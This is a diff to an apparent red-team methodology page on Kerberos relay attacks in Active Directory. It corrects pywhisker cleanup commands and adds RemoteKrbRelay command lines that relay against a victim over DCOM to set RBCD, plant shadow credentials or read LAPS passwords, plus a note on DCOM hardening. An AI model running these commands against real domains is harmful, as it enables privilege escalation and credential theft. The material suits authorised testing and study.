@@ -106,13 +106,27 @@ rbcd_x64.exe -delegate-to "TARGET_NAME$" -delegate-from "COMPUTER_NAME$" -action
 ```batch
 
 REM With a Domain Admin account
-pywhisker_x64.exe -d "DOMAIN" -u "DA_NAME" -p "DA_PASS" --target "TARGET_NAME$" remove --device-id "DEVICE_GUID" --dc-ip "DC_IP"
+pywhisker_x64.exe -d "DOMAIN" -u "DA_NAME" -p "DA_PASS" --target "TARGET_NAME$" --action remove --device-id "DEVICE_GUID" --dc-ip "DC_IP"
 REM With the target computer account's NT hash
-pywhisker_x64.exe -d "DOMAIN" -u "TARGET_NAME$" -H "TARGET_NT_HASH" --target "TARGET_NAME$" remove --device-id "DEVICE_GUID" --dc-ip "DC_IP"
+pywhisker_x64.exe -d "DOMAIN" -u "TARGET_NAME$" -H "TARGET_NT_HASH" --target "TARGET_NAME$" --action remove --device-id "DEVICE_GUID" --dc-ip "DC_IP"
+
+```
+
+## Remote variant (RemoteKrbRelay)
+
+The same RBCD / Shadow Credentials outcomes, but triggered remotely against a vulnerable DCOM object on the victim (no code runs locally):
+
+```batch
+
+RemoteKrbRelay.exe -rbcd -victim VICTIM_FQDN -target DC_FQDN -clsid CLSID -cn FAKEMACHINE$
+RemoteKrbRelay.exe -shadowcred -victim VICTIM_FQDN -target DC_FQDN -clsid CLSID -forceshadowcred
+RemoteKrbRelay.exe -laps -victim VICTIM_FQDN -target DC_FQDN -clsid CLSID
 
 ```
 
 ## Caution
+
+**Warning:** **DCOM hardening (~Nov 2022, CVE-2021-26414)** enforces packet integrity, so the local COM path (KrbRelayUp) often fails to relay to LDAP on patched hosts - LDAP signing / Channel Binding must be off, and when the local path fails the AD CS route ([Kerberos Relay to ADCS](Kerberos%20Relay%20to%20ADCS.md)) is the usual fallback. See [_Intro to Kerberos Relay](_Intro%20to%20Kerberos%20Relay.md).
 
 **Warning:** Cleartext passwords on the command line can end up in the PowerShell history. Do not skip cleanup, including removing any created computer account - if you cannot, note the remaining artifacts in the report.
 
@@ -121,3 +135,4 @@ pywhisker_x64.exe -d "DOMAIN" -u "TARGET_NAME$" -H "TARGET_NT_HASH" --target "TA
 - KrbRelayUp - https://github.com/Dec0ne/KrbRelayUp
 - pywhisker - https://github.com/ShutdownRepo/pywhisker
 - rbcd.py (Impacket) - https://github.com/fortra/impacket/tree/master/examples
+- RemoteKrbRelay - https://github.com/CICADA8-Research/RemoteKrbRelay
